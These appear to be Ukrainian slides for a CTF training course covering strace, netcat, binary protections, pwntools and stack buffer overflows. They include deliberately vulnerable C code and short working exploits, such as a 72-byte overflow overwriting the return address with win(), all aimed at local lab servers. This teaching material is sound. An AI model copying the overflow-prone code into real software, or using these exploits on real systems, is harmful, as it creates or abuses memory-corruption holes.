–Ø–∫ —Ü–µ –ø—Ä–∞—Ü—é—î

```c
pid_t pid = fork();

if (pid == 0) {
    // –î–æ—á—ñ—Ä–Ω—ñ–π –ø—Ä–æ—Ü–µ—Å
    start_http_server();
} else if (pid > 0) {
    // –ë–∞—Ç—å–∫—ñ–≤—Å—å–∫–∏–π –ø—Ä–æ—Ü–µ—Å
    exit(0);  // –®–≤–∏–¥–∫–æ –∑–∞–≤–µ—Ä—à—É—î—Ç—å—Å—è
}
```

**–ï—Ñ–µ–∫—Ç**: –ó–¥–∞—î—Ç—å—Å—è —â–æ –ø—Ä–æ–≥—Ä–∞–º–∞ –Ω—ñ—á–æ–≥–æ –Ω–µ —Ä–æ–±–∏—Ç—å

---

# Task 07: strace –∑ fork

–û–ø—Ü—ñ—è -f –¥–ª—è –¥–æ—á—ñ—Ä–Ω—ñ—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤

````md magic-move
```bash
strace ./build/re107 Alice
# –ë–µ–∑ -f: —Ç—ñ–ª—å–∫–∏ –±–∞—Ç—å–∫–æ
```

```bash
strace -f ./build/re107 Alice
# –ó -f: –±–∞—Ç—å–∫–æ + –¥–∏—Ç–∏–Ω–∞
```

```bash
strace -f -e trace=%network ./build/re107 Alice
# –¢—ñ–ª—å–∫–∏ –º–µ—Ä–µ–∂–µ–≤—ñ –≤–∏–∫–ª–∏–∫–∏!
```
````

---

# Task 07: –í–∏—è–≤–ª–µ–Ω–Ω—è HTTP —Å–µ—Ä–≤–µ—Ä–∞

–ê–Ω–∞–ª—ñ–∑ –º–µ—Ä–µ–∂–µ–≤–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤

```bash
# –£ —Ç—Ä–∞—Å—ñ:
socket(AF_INET, SOCK_STREAM, ...) = 3
bind(3, {sin_port=htons(31337),
         sin_addr=inet_addr("127.0.0.1")}, 16) = 0
listen(3, 8) = 0
```

**–ó–Ω–∞–π–¥–µ–Ω–æ**: –ü–æ—Ä—Ç 31337 –Ω–∞ localhost!

---

# Task 07: –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è

–û—Ç—Ä–∏–º–∞–Ω–Ω—è FLAG

```bash
# –£ –Ω–æ–≤–æ–º—É —Ç–µ—Ä–º—ñ–Ω–∞–ª—ñ
curl http://127.0.0.1:31337/?name=Alice
# FLAG{task7_ok_Alice}
```

**–ê–±–æ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—è**: –ó–∞–ø—É—Å–∫ —É —Ñ–æ–Ω—ñ + curl

---

# Task 07: strace –æ–ø—Ü—ñ—ó

–ö–æ—Ä–∏—Å–Ω—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏

```bash
strace -f               # –§–æ—Ä–∫–∏
strace -e trace=%file   # –§–∞–π–ª–æ–≤—ñ –æ–ø–µ—Ä–∞—Ü—ñ—ó
strace -e trace=%network # –ú–µ—Ä–µ–∂–∞
strace -s 1000          # –î–æ–≤–≥—ñ —Ä—è–¥–∫–∏
strace -o file.txt      # –í–∏–≤—ñ–¥ —É —Ñ–∞–π–ª
strace -t               # –ó —á–∞—Å–æ–º
```

---

# –í–∏—Å–Ω–æ–≤–∫–∏: RE

–ö–ª—é—á–æ–≤—ñ –ø—Ä–∏–Ω—Ü–∏–ø–∏

- üìà **–ü—Ä–æ–≥—Ä–µ—Å—ñ—è**: strings ‚Üí GDB ‚Üí Ghidra ‚Üí strace
- üõ†Ô∏è **–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏**: –ö–æ–∂–µ–Ω –¥–ª—è —Å–≤–æ—î—ó –∑–∞–¥–∞—á—ñ
- üéì **–ù–∞–≤—á–∞–Ω–Ω—è**: –í—ñ–¥ —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –¥–æ –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ
- üìù **–ú–µ—Ç–æ–¥–æ–ª–æ–≥—ñ—è**: –ü–æ—á–∏–Ω–∞—Ç–∏ –∑ —ñ–Ω–≤–µ–Ω—Ç–∞—Ä–∏–∑–∞—Ü—ñ—ó

**7 –∑–∞–≤–¥–∞–Ω—å** –ø–æ–∫—Ä–∏–≤–∞—é—Ç—å –ø–æ–≤–Ω–∏–π —Å–ø–µ–∫—Ç—Ä –±–∞–∑–æ–≤–æ–≥–æ RE

---

# Stage 01: –©–æ —Ç–∞–∫–µ TCP/IP?

–ü—Ä–æ—Ç–æ–∫–æ–ª –ø–µ—Ä–µ–¥–∞—á—ñ –¥–∞–Ω–∏—Ö

**–ê–Ω–∞–ª–æ–≥—ñ—è**: –¢–µ–ª–µ—Ñ–æ–Ω–Ω–∏–π –¥–∑–≤—ñ–Ω–æ–∫
1. –î–∑–≤–æ–Ω–∏—Ç–∏ (–ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—å)
2. –°–ø—ñ–≤—Ä–æ–∑–º–æ–≤–Ω–∏–∫ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î (accept)
3. –†–æ–∑–º–æ–≤–∞ (–æ–±–º—ñ–Ω –¥–∞–Ω–∏–º–∏)
4. –ü–æ–∫–ª–∞—Å—Ç–∏ —Å–ª—É—Ö–∞–≤–∫—É (close)

**netcat** - —à–≤–µ–π—Ü–∞—Ä—Å—å–∫–∏–π –Ω–æ–∂–∏–∫ –¥–ª—è –º–µ—Ä–µ–∂—ñ

---

# Stage 01: File Descriptors

–Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∏ –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö —Ñ–∞–π–ª—ñ–≤

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ 0  ‚îÇ stdin  (–≤–≤—ñ–¥)          ‚îÇ
‚îÇ 1  ‚îÇ stdout (–≤–∏–≤—ñ–¥)         ‚îÇ
‚îÇ 2  ‚îÇ stderr (–ø–æ–º–∏–ª–∫–∏)       ‚îÇ
‚îÇ 3+ ‚îÇ –Ü–Ω—à—ñ —Ñ–∞–π–ª–∏/–∑'—î–¥–Ω–∞–Ω–Ω—è   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–£ –∫–æ–¥—ñ**: `read(0, ...)`, `dprintf(1, ...)`

---

# Stage 01: –ê–Ω–∞–ª—ñ–∑ –∫–æ–¥—É —Å–µ—Ä–≤–µ—Ä–∞

–ü–æ–∫—Ä–æ–∫–æ–≤–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

```c
int s = tcp_listen("127.0.0.1", 7101);  // 1
int c = tcp_accept_one(s);               // 2
dprintf(c, "say HELLO or GIMME FLAG\n"); // 3
char buf[256]={0};
read(c, buf, 255);                       // 4
if (strstr(buf, "GIMME FLAG"))           // 5
    dprintf(c, "FLAG{...}\n");
```

---

# Stage 01: –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è netcat

–ë–∞–∑–æ–≤–∞ –≤–∑–∞—î–º–æ–¥—ñ—è

````md magic-move
```bash
nc 127.0.0.1 7101
```

```bash
nc 127.0.0.1 7101
say HELLO or GIMME FLAG
```

```bash
nc 127.0.0.1 7101
say HELLO or GIMME FLAG
GIMME FLAG
FLAG{STAGE1_HELLO}
```
````

---

# Stage 01: Troubleshooting

–ü–æ—à–∏—Ä–µ–Ω—ñ –ø—Ä–æ–±–ª–µ–º–∏

**"Connection refused"** ‚Üí –°–µ—Ä–≤–µ—Ä –Ω–µ –∑–∞–ø—É—â–µ–Ω–∏–π

**"Address already in use"** ‚Üí –ü–æ—Ä—Ç –∑–∞–π–Ω—è—Ç–∏–π
```bash
lsof -i :7101
kill -9 <PID>
```

**–ù—ñ—á–æ–≥–æ –Ω–µ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è** ‚Üí –ù–∞—Ç–∏—Å–Ω—ñ—Ç—å Enter!

---

# Stage 02: Stack Canary

–ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ buffer overflow

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Saved RIP  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Saved RBP  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ **CANARY** ‚îÇ ‚Üê –°–µ–∫—Ä–µ—Ç–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è!
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ buf[64]    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**: –ü—Ä–∏ –≤–∏—Ö–æ–¥—ñ –∑ —Ñ—É–Ω–∫—Ü—ñ—ó canary –º–∞—î –∑–±—ñ–≥–∞—Ç–∏—Å—è

---

# Stage 02: –Ø–∫ –ø—Ä–∞—Ü—é—î Canary

Assembly –∫–æ–¥

````md magic-move
```asm
; –ü—Ä–∏ –≤—Ö–æ–¥—ñ:
mov rax, QWORD PTR fs:0x28
mov QWORD PTR [rbp-0x8], rax
```

```asm
; –ü—Ä–∏ –≤–∏—Ö–æ–¥—ñ:
mov rax, QWORD PTR [rbp-0x8]
xor rax, QWORD PTR fs:0x28
je .L_ok
call __stack_chk_fail  # PANIC!
```
````

**–Ø–∫—â–æ –∑–º—ñ–Ω–∏–ª–∞—Å—å**: `*** stack smashing detected ***`

---

# Stage 02: NX (No eXecute)

–ó–∞–±–æ—Ä–æ–Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤ —Å—Ç–µ–∫—É

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ .text   ‚îÇ ‚úÖ X ‚îÇ ‚ùå W       ‚îÇ
‚îÇ .data   ‚îÇ ‚ùå X ‚îÇ ‚úÖ W       ‚îÇ
‚îÇ Stack   ‚îÇ ? X  ‚îÇ ‚úÖ W       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**NX ON**: Stack ‚ùå –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π ‚Üí –ø–æ—Ç—Ä—ñ–±–µ–Ω ROP
**NX OFF**: Stack ‚úÖ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π ‚Üí –º–æ–∂–Ω–∞ shellcode

---

# Stage 02: PIE + ASLR

–†–∞–Ω–¥–æ–º—ñ–∑–∞—Ü—ñ—è –∞–¥—Ä–µ—Å

```
–ë–µ–∑ PIE:
./binary ‚Üí 0x400000 (–∑–∞–≤–∂–¥–∏)
./binary ‚Üí 0x400000 (–∑–∞–≤–∂–¥–∏)

–ó PIE + ASLR:
./binary ‚Üí 0x555555554000
./binary ‚Üí 0x5555557 8a000 (—Ä—ñ–∑–Ω—ñ!)
```

**–û–±—Ö—ñ–¥**: –ü–æ—Ç—Ä—ñ–±–µ–Ω leak –∞–¥—Ä–µ—Å–∏

---

# Stage 02: RELRO

–ó–∞—Ö–∏—Å—Ç GOT/PLT —Ç–∞–±–ª–∏—Ü—å

**No RELRO**: GOT –∑–∞–ø–∏—Å—É–≤–∞–Ω–∏–π (GOT overwrite –º–æ–∂–ª–∏–≤–∏–π)

**Partial RELRO**: `.got.plt` –≤—Å–µ —â–µ –¥–æ—Å—Ç—É–ø–Ω–∏–π

**Full RELRO**: –í—Å–µ read-only (–Ω–µ–º–æ–∂–ª–∏–≤–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏)

**–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞**: `readelf -d binary | grep BIND_NOW`

---

# Stage 02: –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç checksec

–ê–Ω–∞–ª—ñ–∑ –∑–∞—Ö–∏—Å—Ç—ñ–≤

```bash
checksec --file=binary
```

**–í–∏–≤—ñ–¥:**
```
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
```

**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è**: –í–∏–±—ñ—Ä —Å—Ç—Ä–∞—Ç–µ–≥—ñ—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó

---

# Stage 03: –ß–æ–º—É pwntools?

–ü—Ä–æ–±–ª–µ–º–∏ –∑ netcat

**Netcat:**
- ‚ùå –†—É—á–Ω–µ –≤–≤–µ–¥–µ–Ω–Ω—è (–ø–æ–≤—ñ–ª—å–Ω–æ)
- ‚ùå –ë—ñ–Ω–∞—Ä–Ω—ñ –¥–∞–Ω—ñ —Å–∫–ª–∞–¥–Ω–æ
- ‚ùå –ù–µ–º–∞—î –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—ó

**Pwntools:**
- ‚úÖ –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü—ñ—è
- ‚úÖ –ë—ñ–Ω–∞—Ä–Ω—ñ –¥–∞–Ω—ñ –ª–µ–≥–∫–æ
- ‚úÖ Debugging –≤–±—É–¥–æ–≤–∞–Ω–∏–π

---

# Stage 03: –ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è

remote() —Ç–∞ process()

````md magic-move
```python
from pwn import *
```

```python
from pwn import *
io = remote('127.0.0.1', 7101)
```

```python
from pwn import *
io = remote('127.0.0.1', 7101, timeout=5)
io = process('./binary')  # –õ–æ–∫–∞–ª—å–Ω–æ
```
````

---

# Stage 03: –û—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö

recv —Ñ—É–Ω–∫—Ü—ñ—ó

```python
io.recv(1024)            # –î–æ 1024 –±–∞–π—Ç
io.recvline()            # –î–æ \n
io.recvuntil(b'prompt')  # –î–æ –ø–µ–≤–Ω–æ–≥–æ —Ä—è–¥–∫–∞
io.recvall(timeout=2)    # –í—Å–µ (–∑ —Ç–∞–π–º–∞—É—Ç–æ–º)
```

**–ù–∞–π—á–∞—Å—Ç—ñ—à–µ**: `recvuntil()` –¥–ª—è –±–∞–Ω–µ—Ä—ñ–≤

---

# Stage 03: –í—ñ–¥–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–∏—Ö

send —Ñ—É–Ω–∫—Ü—ñ—ó

```python
io.send(b'data')         # –ë–µ–∑ \n
io.sendline(b'data')     # –ó \n
io.sendafter(b'>', b'cmd')  # –ü—ñ—Å–ª—è prompt
```

**–í–∞–∂–ª–∏–≤–æ**: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `b'...'` (bytes)

---

# Stage 03: –ü–∞–∫—É–≤–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö

p64() —Ç–∞ u64()

````md magic-move
```python
address = 0x401136
```

```python
address = 0x401136
packed = p64(address)
# b'\x36\x11\x40\x00\x00\x00\x00\x00'
```

```python
leaked = b'\x90\x78\x56\x34\x12\x7f\x00\x00'
address = u64(leaked)  # 0x7f3456789090
```
````

**Little Endian**: –ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—è

---

# Stage 03: ELF –æ–ø–µ—Ä–∞—Ü—ñ—ó

–†–æ–±–æ—Ç–∞ –∑ –±—ñ–Ω–∞—Ä–Ω–∏–∫–æ–º

```python
elf = ELF('./binary', checksec=False)

elf.symbols['win']    # –ê–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü—ñ—ó
elf.plt['puts']       # PLT entry
elf.got['puts']       # GOT entry
elf.bss(0x100)        # BSS + offset
```

**–ó—Ä—É—á–Ω–æ**: –ù–µ —Ç—Ä–µ–±–∞ objdump!

---

# Stage 03: Logging

–ö–æ–Ω—Ç—Ä–æ–ª—å –≤–∏–≤–æ–¥—É

```python
context.log_level = 'debug'   # –í—Å–µ
context.log_level = 'info'    # –û—Å–Ω–æ–≤–Ω–µ
context.log_level = 'warning' # –ú—ñ–Ω—ñ–º—É–º
context.log_level = 'error'   # –ü–æ–º–∏–ª–∫–∏
```

**Debugging**: `debug` –ø–æ–∫–∞–∑—É—î –≤–µ—Å—å —Ç—Ä–∞—Ñ—ñ–∫

---

# Stage 03: Cyclic pattern

–ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è offset

```python
# –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è
pattern = cyclic(200)

# –ü–æ—à—É–∫
offset = cyclic_find(0x6161616c)  # 'laaa'
```

**–®–≤–∏–¥–∫–æ**: –£–Ω—ñ–∫–∞–ª—å–Ω—ñ 4-–±–∞–π—Ç–Ω—ñ –ø—ñ–¥—Ä—è–¥–∫–∏

---

# Stage 04: Function pointers

–©–æ —Ü–µ —Ç–∞–∫–µ?

```c
void win() { printf("FLAG\n"); }

void (*fp)() = win;  // –í–∫–∞–∑—ñ–≤–Ω–∏–∫ –Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—é
fp();                 // –í–∏–∫–ª–∏–∫ —á–µ—Ä–µ–∑ –≤–∫–∞–∑—ñ–≤–Ω–∏–∫
```

**–ö–æ–Ω—Ü–µ–ø—Ü—ñ—è**: –ê–¥—Ä–µ—Å–∞ ‚Üí –í–∏–∫–æ–Ω–∞–Ω–Ω—è

---

# Stage 04: CPU level

–Ø–∫ –ø—Ä–∞—Ü—é—î –≤–∏–∫–ª–∏–∫

````md magic-move
```asm
call 0x401136    # –ü—Ä—è–º–∏–π –≤–∏–∫–ª–∏–∫
```

```asm
mov rax, 0x401136
call rax          # –í–∏–∫–ª–∏–∫ —á–µ—Ä–µ–∑ —Ä–µ–≥—ñ—Å—Ç—Ä
```

```asm
mov rax, [rbp-0x8]  # –ß–∏—Ç–∞–Ω–Ω—è –∑ –ø–∞–º'—è—Ç—ñ
call rax             # –í–∏–∫–ª–∏–∫ –∑–∞ –∞–¥—Ä–µ—Å–æ—é
```
````

---

# Stage 04: –ó–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –∞–¥—Ä–µ—Å

–ú–µ—Ç–æ–¥–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∞–¥—Ä–µ—Å–∏ win()

````md magic-move
```bash
objdump -d binary | grep '<win>'
# 0000000000401136 <win>:
```

```python
from pwn import *
elf = ELF('./binary', checksec=False)
print(hex(elf.symbols['win']))
# 0x401136
```
````

**–†–µ–∫–æ–º–µ–Ω–¥–æ–≤–∞–Ω–æ**: pwntools (–Ω–∞–π–ø—Ä–æ—Å—Ç—ñ—à–µ)

---

# Stage 04: –©–æ —Ç–∞–∫–µ p64()?

–ü–∞–∫—É–≤–∞–Ω–Ω—è —É little endian

```python
p64(0x401136)
# b'\x36\x11\x40\x00\x00\x00\x00\x00'
#    ‚Üì    ‚Üì    ‚Üì    ‚Üì    ‚Üì    ‚Üì    ‚Üì    ‚Üì
# LSB                              MSB
```

**–ß–æ–º—É 8 –±–∞–π—Ç?**: 64-–±—ñ—Ç–Ω–∞ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∞

---

# Stage 04: Solver

–ü–æ–≤–Ω–∏–π –µ–∫—Å–ø–ª–æ–π—Ç

```python
from pwn import *

elf = ELF('build/stage04', checksec=False)
io = remote('127.0.0.1', 7104)

io.send(p64(elf.symbols['win']))
print(io.recvall(timeout=1).decode())
```

---

# Stage 05: Stack frame

–ê–Ω–∞—Ç–æ–º—ñ—è —Å—Ç–µ–∫–æ–≤–æ–≥–æ —Ñ—Ä–µ–π–º—É

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚Üê –í–∏—â–∞ –∞–¥—Ä–µ—Å–∞
‚îÇ RIP     ‚îÇ [rbp+8]   ‚Üê –ö—É–¥–∏ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ RBP     ‚îÇ [rbp]     ‚Üê –ó–±–µ—Ä–µ–∂–µ–Ω–∏–π RBP
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ buf[64] ‚îÇ [rbp-64]  ‚Üê –õ–æ–∫–∞–ª—å–Ω–∏–π –±—É—Ñ–µ—Ä
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚Üê –ù–∏–∂—á–∞ –∞–¥—Ä–µ—Å–∞
```

**Offset**: –í—ñ–¥—Å—Ç–∞–Ω—å –≤—ñ–¥ buf[0] –¥–æ RIP

---

# Stage 05: NEED hint

–Ü–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞ –ø—ñ–¥–∫–∞–∑–∫–∞

```c
if (received < OFFSET + 8) {
    int need = (OFFSET + 8) - received;
    dprintf(c, "NEED=%d\n", need);
}
```

**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è**: –°–µ—Ä–≤–µ—Ä —Å–∞–º –∫–∞–∂–µ —Å–∫—ñ–ª—å–∫–∏ –±–∞–π—Ç—ñ–≤ —Ç—Ä–µ–±–∞

---

# Stage 05: –ú–µ—Ç–æ–¥–∏ –ø–æ—à—É–∫—É offset

4 —Å–ø–æ—Å–æ–±–∏

**1. Server hints** (our case) - —Å–µ—Ä–≤–µ—Ä –ø—ñ–¥–∫–∞–∑—É—î

**2. GDB** - —Ç–æ—á–Ω–æ —ñ –≤—ñ–∑—É–∞–ª—å–Ω–æ

**3. Cyclic pattern** - –Ω–∞–π—à–≤–∏–¥—à–µ

**4. Binary search** - –∞–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–æ

---

# Stage 05: GDB –º–µ—Ç–æ–¥

–í—ñ–∑—É–∞–ª—å–Ω–µ –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è

````md magic-move
```bash
gdb ./binary
run < <(python3 -c "print('A'*100)")
```

```bash
# Segfault: RIP = 0x4141414141414141
# –ó–º–µ–Ω—à—É—î–º–æ –¥–æ 80...
run < <(python3 -c "print('A'*80)")
```

```bash
# Segfault: RIP = 0x4141414141414141
# –ó–º–µ–Ω—à—É—î–º–æ –¥–æ 72...
run < <(python3 -c "print('A'*72+'\xef\xbe\xad\xde')")
# RIP = 0xdeadbeef ‚Üí Offset = 72!
```
````

---

# Stage 05: –ß–æ–º—É offset ‚â† sizeof(buf)?

Compiler alignment

```
buf[64]     64 bytes
padding     0-15 bytes (align to 16)
saved RBP   8 bytes
saved RIP   8 bytes (offset = 64+padding+8)
```

**–ù–∞—à –≤–∏–ø–∞–¥–æ–∫**: 64 + 0 + 8 = 72 –±–∞–π—Ç–∏

---

# Stage 05: Payload —Å—Ç—Ä—É–∫—Ç—É—Ä–∞

Byte-by-byte breakdown

```python
payload = b'A' * 72          # buf + RBP
payload += p64(win_address)  # RIP

# [0..63]: buf[64] –∑–∞–ø–æ–≤–Ω–µ–Ω–∏–π 'A'
# [64..71]: saved RBP = 'AAAAAAAA'
# [72..79]: saved RIP = –∞–¥—Ä–µ—Å–∞ win()
```

---

# Stage 06: –©–æ —Ç–∞–∫–µ Buffer Overflow?

–í–∏–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–∞ –Ω–µ–±–µ–∑–ø–µ–∫–∞

**–ù–æ—Ä–º–∞–ª—å–Ω–æ:**
```
read(64) ‚Üí buf[64]  ‚úÖ
```

**Overflow:**
```
read(100) ‚Üí buf[64] ‚Üí ... ‚Üí RIP ‚ùå
```

**–ù–∞—Å–ª—ñ–¥–æ–∫**: –ö–æ–Ω—Ç—Ä–æ–ª—å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—Ä–æ–≥—Ä–∞–º–∏

---

# Stage 06: –ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î?

Return mechanism

````md magic-move
```c
void vuln() {
    char buf[64];
    gets(buf);  // Overflow!
    return;     // ‚Üê –©–æ —Ç—É—Ç –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è?
}
```

```asm
; return –≤ assembly:
leave    ; mov rsp, rbp; pop rbp
ret      ; pop rip; jmp rip
```

```
; –Ø–∫—â–æ RIP –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω–∏–π:
pop rip  ‚Üí rip = –∞–¥—Ä–µ—Å–∞ win()
jmp rip  ‚Üí –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è win()!
```
````

---

# Stage 06: –í—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥

–ê–Ω–∞–ª—ñ–∑ —Å–µ—Ä–≤–µ—Ä–∞

```c
void vuln() {
    char buf[64];
    read(0, buf, 256);  // ‚Üê Overflow!
    // 256 –±–∞–π—Ç —É –±—É—Ñ–µ—Ä —Ä–æ–∑–º—ñ—Ä–æ–º 64!
}

void win() {
    printf("FLAG{...}\n");
}
```

---

# Stage 06: Frame 0 - Start

–ü—Ä–æ–≥—Ä–∞–º–∞ –∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ main()   ‚îÇ ‚Üê –í–∏–∫–æ–Ω—É—î—Ç—å—Å—è
‚îÇ   ...    ‚îÇ
‚îÇ call vuln‚îÇ ‚Üê –ù–∞—Å—Ç—É–ø–Ω–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

Stack: [empty]
```

---

# Stage 06: Frame 1 - Call

main() –≤–∏–∫–ª–∏–∫–∞—î vuln()

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ vuln()   ‚îÇ ‚Üê –ü–µ—Ä–µ—Ö–æ–¥–∏–º–æ —Å—é–¥–∏
‚îÇ   ...    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

Stack:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ ret‚Üímain ‚îÇ ‚Üê –ó–±–µ—Ä–µ–∂–µ–Ω–∞ –∞–¥—Ä–µ—Å–∞ –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

# Stage 06: Frame 2 - Prologue

vuln() —Å—Ç–≤–æ—Ä—é—î —Å–≤—ñ–π frame

```
vuln():
  push rbp       # –ó–±–µ—Ä–µ–≥—Ç–∏ RBP
  mov rbp, rsp   # –ù–æ–≤–∏–π RBP
  sub rsp, 64    # –ú—ñ—Å—Ü–µ –¥–ª—è buf

Stack:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ buf[64]  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇsaved RBP ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ret‚Üímain ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

# Stage 06: Frame 3 - Read

read() –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è

```c
read(0, buf, 256);  // ‚Üê –¢–û–¢–£–¢!
